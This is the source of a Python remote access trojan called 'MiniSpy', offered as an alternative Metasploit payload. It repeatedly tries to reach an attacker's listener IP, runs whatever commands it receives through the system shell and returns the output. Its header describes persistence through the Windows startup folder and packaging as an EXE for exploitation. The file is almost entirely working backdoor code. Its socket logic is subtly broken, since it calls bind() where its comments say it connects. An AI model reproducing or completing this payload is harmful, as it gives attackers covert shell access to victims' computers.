# MiniSpy Payload

# Introduction:
# An alternate Python payload for Rapid 7's Metasploit Python Payload (https://www.rapid7.com/).
# It is combined with the custom listener for controlling this payload.
# For a simple introduction about what a payload and listener is go to
# https://us.norton.com/internetsecurity-malware-what-is-a-trojan.html
# This is based off of Remote Access Trojan & Backdoor Trojan.
# The purpose of this project is to understand and create effective trojans.
# This will not be a 100% FUD (Fully UnDetectable) by any means.
# This is just supposed to provide an alternative for Pen Testers
# (https://www.cyberdegrees.org/jobs/penetration-tester/). The way this program works is
# the payload will try to bind to the listener. Then backdoor access will provide access to the
# CMD (Command Prompt) or the Terminal based on the operating system. The installer will
# put the payload onto the startup file of windows (Linux not supported) so after reboot
# the program will provide a persistent backdoor. All of the programs (except MiniSpy_Listener.py)
# will be turned into an EXE with Pyinstaller (https://www.pyinstaller.org/) for easy exploitation.

# --------------------------------------------------------------------------------------------------

# Import Libraries
import socket  # For the backdoor connection
import os  # For CMD or terminal access
import time  # To space out the try again time and reduce battery consumption and traffic

# Call important variables
target_ip = 'Enter You IP Here'  # IMPORTANT: You must replace with your IP. Use the computer that will be using the
# listener. Not the IP of the computer the payload will be on.
target_port = 0000  # ALSO IMPORTANT: You also must use a port that is not being used. I like using 4444
# or 4000 but don't use any ports that require admin access.

# Start LOOP so the program will never end (Even if an error occurs)
while True:
    payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # This is a connection object.
    # It is using a TCP based connection.

    while True:  # This will make sure when the listener goes up, the payload will be ready
        try:  # So if we cannot connected it will go to else
            payload.bind((target_ip, target_port))
            break  # If we are connected break out of the loop

        except:  # If we cannot connect to the listener wait and try again
            time.sleep(3)  # You can change this to any wait time

    # Now we need to communicate with the listener and pass any commands to the shell
    while True:  # Another while true. It will break if their is an error.
        try:
            from_listener = payload.recv(1024)  # Only receive 1024 encoded bytes of data
            from_listener = from_listener.decode('utf-8')  # Decode the data

            # If the listener exits then it will send exit. We need to then exit the connection
            if from_listener == 'exit':
                break

            # Now we need to pass it to the shell
            from_shell = os.popen(from_listener).read()  # Pass the command the read the results

            # Check if the shell returned something if we just sent nothing an error would occur
            if from_shell.strip() == '':
                from_shell = 'NO DATA FROM SHELL'  # Return to the listener that the shell gave us nothing

            # Send some data back to the listener (the from_shell to be specific)
            payload.sendall(from_shell.encode('utf-8'))  # You must encode the string before sending

        except:  # This will occur only if we got an error
            break  # If we get an error start back at the first while loop
